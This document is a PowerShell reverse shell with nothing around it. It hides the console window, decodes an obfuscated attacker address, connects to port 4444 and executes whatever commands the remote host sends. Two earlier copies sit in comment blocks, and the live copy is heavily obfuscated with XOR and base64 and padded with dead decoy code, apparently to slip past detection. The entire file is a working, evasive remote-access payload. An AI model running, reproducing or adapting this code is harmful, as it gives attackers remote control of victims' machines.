<#
Add-Type -Name Win -Namespace Console -MemberDefinition @"
  [DllImport("user32.dll")]
  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
  [DllImport("kernel32.dll")]
  public static extern IntPtr GetConsoleWindow();
"@
#>
<#
$consolePtr = [Console.Win]::GetConsoleWindow()
[Console.Win]::ShowWindowAsync($consolePtr, 0)
$LHOST = $($k4814='YN:,Phk7';$b=[byte[]](0x68,0x77,0x08,0x02,0x61,0x5E,0x53,0x19,0x68,0x60,0x08,0x1E,0x64);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4814);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})); $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(($Output + $($k8745='YMXmQq-L=lhE';$b=[byte[]](0x39,0x23);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8745);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
if ($false) {
    $xmlDoc = [xml]::new(); $rootElement = $xmlDoc.CreateElement("Config"); $childElement = $xmlDoc.CreateElement("Setting"); $childElement.InnerText = (Get-Random); $rootElement.AppendChild($childElement) | Out-Null; $xmlDoc.AppendChild($rootElement) | Out-Null; Write-Verbose "Generated XML fragment: $($xmlDoc.OuterXml)"
}
#>
<#
$lhost = $($K9508=('GM3'+'Pvu'+'7+'+':2]v');$B=[byte[]](0x76,0x74,0x01,0X7E,0X47,0x43,0X0f,0X05,0X0b,0X1c,0X6F,0x44,0X73);$kb=[SYsTeM.texT.ENCOdiNG]::utf8.GetbYteS($k9508);-join(0..($B.lenGth-1)|%{[cHaR]($b[$_]-bxor$kb[$_%$Kb.lEnGTH])})); $lpoRt = 4444; $TcpclIEnt = NeW-oBjeCt NEt.SOCkets.TCpclIEnt($lhost, $lPOrt); $NEtwOrKstREam = $tCpCLIeNt.geTSTReam(); $STREaMrEAdEr = new-ObjECT Io.strEaMReaDER($networKStreAm); $StReaMwRiTer = NeW-OBjeCt iO.strEAmWrIter($netWORKStrEam); $StrEaMwriter.AUTOFLusH = $tRue; $buFfeR = new-oBJEcT sySTEM.ByTE[] 1024; while ($TCPCLIenT.CoNneCteD) { while ($NEtwOrksTream.DataaVaiLAble) { $RaWdATA = $NETwoRKsTReam.rEad($bufFer, 0, $bufFER.leNgTh); $COde = ([TeXT.EncodING]::utf8).GeTStriNg($bUffER, 0, $rAWdATa -1) }; if ($TCPclIEnT.CONnecteD -and $CoDe.LeNGTH -gt 1) { $OutPUT = try { InVoKE-exprESSiOn ($cOde) 2>&1 } catch { $_ }; $StReAMWrIteR.wRite(($outpuT + ([SySTEm.TEXt.eNcODIng]::utf8.gEtSTrIng([SysTEM.coNVerT]::froMbase64StrInG((-join('Y','G4','='))))))); $CoDE = $nuLL } }; $TCpclienT.CloSe(); $nETWOrKStReam.ClOSe(); $StreamREaDER.cLosE(); $StReAmWriTER.CLOSe()
if ((GEt-raNDOm -mIniMum 1000 -MaXimum 5000) -lt 0) {
    $MEMcouNteR = GET-cOuNtER -CoUntEr ('\Memory\'+'Avail'+'able MBy'+'t'+'e'+'s'); writE-dEBUG ($($k6913='tzmQ7+1D?abN2';$b=[byte[]](0x35,0x0C,0x0C,0x38,0x5B,0x4A,0x53,0x28,0x5A,0x41,0x2F,0x2B,0x5F,0x1B,0x08,0x14,0x71,0x1F,0x58,0x58,0x29,0x4A,0x0D,0x03,0x3A,0x57,0x10,0x5A,0x1E,0x30,0x5A,0x5B,0x5D,0x21,0x16,0x5B,0x42);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6913);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $($memCounter.CounterSamples.CookedValue) + $($k7676=126;$b=[byte[]](0x5e,0x33,0x3c);-join($b|%{[char]($_-bxor$k7676)})))
}
[string]698 | Out-Null
if ($false) {
    $printerInfo = Get-CimInstance -ClassName Win32_Printer | Select-Object -Property Name, DriverName -First 1; if ($printerInfo) { Write-Verbose "Default Printer Driver: $($printerInfo.DriverName)" }
}
#>
$lhosT = $($k9508=($($k6045 = (102 + 46);$B=[byTE[]](0xD3,0xd9,0Xa7);-join($b|%{[ChAr]($_-bxor$k6045)}))+(-join(([SySTEm.Text.ENcOdiNG]::utf8.getstRIng([sYsteM.COnvert]::fROMbase64sTRinG($($k1345='W,+(})1r';$b=[byte[]](0x02,0x64,0x72,0x15);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1345);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))))),'u'))+([sysTEM.TExT.EnCoDIng]::Utf8.getSTrInG([sYsTeM.ConVerT]::FROMBaSe64StrINg(([sYstem.tExT.enCODinG]::UTf8.getsTRing([SYStem.conVerT]::FromBasE64strING($($k6585='s9gz<aSwg#g#V';$b=[byte[]](0x27,0x57,0x0B,0x00,0x6C,0x30,0x6E,0x4A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6585);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))))))))+([sySteM.TeXT.EncOdING]::UtF8.GEtsTrinG([sYsTEM.CONvERt]::FromBASe64STRinG(([SYsTeM.tEXT.ENCODInG]::uTF8.geTStRing([syStEM.CONVeRt]::fROMBaSe64STRing($($k2735=';F,>Ro8F87Gpa)^';$b=[byte[]](0x6F,0x74,0x5C,0x75,0x08,0x28,0x6A,0x28,0x68,0x63,0x77,0x4D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2735);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))))))));$B=[byTE[]](0X76,0x74,0X01,0X7E,0X47,0X43,0X0f,0x05,0x0b,0X1C,0x6f,0X44,0X73);$Kb=[SYStEm.TEXt.eNCoDING]::UTF8.gETbYTes($K9508);-join(0..($b.LENGTH-1)|%{[cHaR]($B[$_]-bxor$KB[$_%$KB.LEngTh])})); $lPort = (2 * 2222); $TcPcLiEnT = NeW-OBJECt neT.SocKETs.TcpClIenT($LHOst, $LPoRt); $nETwORkSTrEAm = $TCpcLiENT.GETSTReAM(); $StreaMReadeR = new-ObjeCT IO.sTrEamReADer($neTwOrkSTREaM); $strEaMwRITeR = neW-obJeCT Io.STreamWRiTer($NeTwOrKStREAm); $stReAMwrITER.auTofluSH = (!0); $bUFFEr = NEW-oBJECt sYSTEm.bYtE[] 1024; while ($tcpClieNT.CoNNecTed) { while ($nETwORKsTreAm.DatAaVailABLe) { $RAwdaTa = $NEtWoRksTream.rEAD($bufFer, (126 % 42), $BuffeR.lENgtH); $COdE = ([TEXt.EncodiNg]::uTf8).gEtstring($BuFFEr, (46 - 46), $raWDATa -1) }; if ($tCPCLIEnt.ConNeCteD -and $cOdE.LENgTh -gt 1) { $outpUT = try { inVOkE-EXpRESSioN ($Code) (25 + -23)>&(2 -bxor 3) } catch { $_ }; $StREAmWRiteR.wRITe(($oUTpUt + ([sysTem.Text.ENcodInG]::uTF8.GeTsTRING([sysTeM.coNvert]::FROmBASe64StRinG((-join(([sySTeM.TEXt.eNcoDing]::UTF8.GetsTrInG([sYsTEM.CONveRT]::fromBaSe64sTrIng($($K5262=$($k9424='clr+>VU],o;';$b=[byte[]](0x0E,0x03,0x3A,0x0A,0x7A,0x13,0x0B,0x6D,0x77,0x02,0x79);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9424);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}));$B=[bYtE[]](0X3a,0X3e,0x75,0X1c);$kB=[SySTem.tExT.encOdING]::utF8.gETbYTEs($k5262);-join(0..($B.length-1)|%{[CHAr]($B[$_]-bxor$kb[$_%$kB.lengTh])}))))),([syStem.tExT.eNcODInG]::utF8.getstRinG([SYStEM.cONvErt]::FROmbASE64sTriNg($($K6560=(-join('D','D','O',')','cv','G4uu7'));$b=[Byte[]](0x16,0x3e,0x1e,0x14);$Kb=[SYsTEM.TeXt.EncOdINg]::UtF8.gEtBYtes($k6560);-join(0..($B.lENgTh-1)|%{[ChAr]($b[$_]-bxor$kB[$_%$KB.LeNGth])}))))),([sysTEM.tExT.ENcOdINg]::UtF8.GEtSTriNg([syStEm.coNVerT]::fRoMBASe64StRINg((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UFE=')))+'=='))))))))))); $cODe = $nULL } }; $TcPCLIENT.closE(); $neTwoRkStREaM.cLoSe(); $stReaMreAdeR.CLOSe(); $sTReaMWrITEr.clOsE()
if ((Get-RANdom -mINimUm 1000 -MAXimuM 5000) -lt 0) {
    $MEmcoUnter = gET-COuNTER -CounTER ($($K8676 = (91 - 74);$b=[BYTe[]](0x4d,0X5c,0X74,0x7c,0X7E,0x63,0x68,0x4D,0X36,0x3A);-join($b|%{[cHAr]($_-bxoR$K8676)}))AvAil'+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('ExdKu1Pz'+'qm5'+'xbk'+'s'+'9')))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($($k9164=49;$b=[byte[]](0x63,0x74,0x74,0x08,0x41,0x60,0x0c,0x0c);-join($b|%{[char]($_-bxor$k9164)}))))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($($k1881 = (108 -bxor 46);$b=[byte[]](0x38,0x13,0x7f,0x7f);-join($b|%{[char]($_-bxor$k1881)})))))+$($k5948 = (2 * 33);$b=[byte[]](0x31);-join($b|%{[char]($_-bxor$k5948)}))); wRiTe-DEbug ($($K6913=$($k3212 = (21 -bxor 141);$b=[byte[]](0xec,0xe2,0xf5,0xc9,0xaf,0xb3,0xa9,0xdc,0xa7,0xf9,0xfa,0xd6,0xaa);-join($b|%{[char]($_-bxor$k3212)}));$b=[Byte[]](0x35,0x0c,0x0C,0x38,0x5b,0X4A,0X53,0x28,0x5a,0X41,0x2f,0x2b,0x5f,0X1b,0X08,0X14,0x71,0x1F,0X58,0X58,0x29,0X4A,0X0D,0X03,0x3a,0x57,0X10,0X5a,0x1E,0x30,0X5A,0X5b,0X5d,0X21,0x16,0x5B,0X42);$KB=[systEM.TexT.EncOdinG]::UTf8.gEtbyTes($k6913);-join(0..($B.lengTH-1)|%{[chAr]($b[$_]-bxor$kb[$_%$Kb.LeNGTH])})) + $($meMCoUNteR.CoUntERsAmPLES.cookedVAlUE) + $($K7676 = (-404 + 530);$B=[bYTe[]](0X5e,0x33,0X3C);-join($B|%{[CHar]($_-bxoR$K7676)})))
}
Get-Alias -Name $($k3390=(-join('nVL','hB<'));$b=[byte[]](0x09,0x35,0x25);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3390);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ErrorAction SilentlyContinue | Out-Null
while ($false) {
    $currentTimeUTC = [System.DateTime]::UtcNow; Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('q3vy'+'cMVu'+'d'+'cb'+'vVemGDG'+'ltZTog')))) + $($currentTimeUTC.ToString('o') + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a1E9PQ==')))))))
}
while ($false) {
    $memCounter = Get-Counter -Counter $($k4129='8VzE_Sbv';$b=[byte[]](0x64,0x1B,0x1F,0x28,0x30,0x21,0x1B,0x2A,0x79,0x20,0x1B,0x2C,0x33,0x32,0x00,0x1A,0x5D,0x76,0x37,0x07,0x26,0x27,0x07,0x05);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4129);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})); Write-Debug (('A'+'vai'+'lable'+' Memo'+'ry ('+'simulate'+'d'+' sampl'+'e):'+' ') + $($memCounter.CounterSamples.CookedValue) + (' '+'MB'))
}
if ((Get-Random -Minimum 1000 -Maximum 5000) -lt 0) {
    $networkConfig = Get-NetIPConfiguration -Detailed | Where-Object {$_.NetIPv4Interface.ConnectionState -eq 'Connected'}; if ($networkConfig) { $ip = ($networkConfig | Select-Object -ExpandProperty IPv4Address).IPAddress; Write-Debug "Active IP: $ip" }
}
$rZ7GK9w = ('a'..'z' | Get-Random -Count 5) -join ''; $rZ7GK9w.ToUpper() | Out-Null; $rZ7GK9w = $null
[STRIng]698 | OuT-NULL
if ($FaLsE) {
    $prIntErinFO = GET-cIMInStANcE -cLAssNAMe wiN32_PrinTEr | selECT-oBjeCt -pRoPERty nAme, DRIVeRNaMe -fIRst 1; if ($pRInteRInFo) { wrItE-vERbosE (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($($k3471 = (252 / 7);$b=[byte[]](0x76,0x63,0x72,0x49,0x5d,0x5c,0x52,0x77,0x60,0x67,0x46,0x75,0x67,0x49,0x48,0x51,0x60,0x43,0x72,0x7d,0x6d,0x61,0x56,0x5d,0x45,0x7c,0x5e,0x68,0x47,0x6e,0x6b,0x43);-join($b|%{[char]($_-bxor$k3471)}))))) + $($printerInfo.DriverName)) }
}
$orH06 = [Math]::Round(69 / 2, 2); $orH06 = [Math]::Abs($orH06); $orH06 = $null
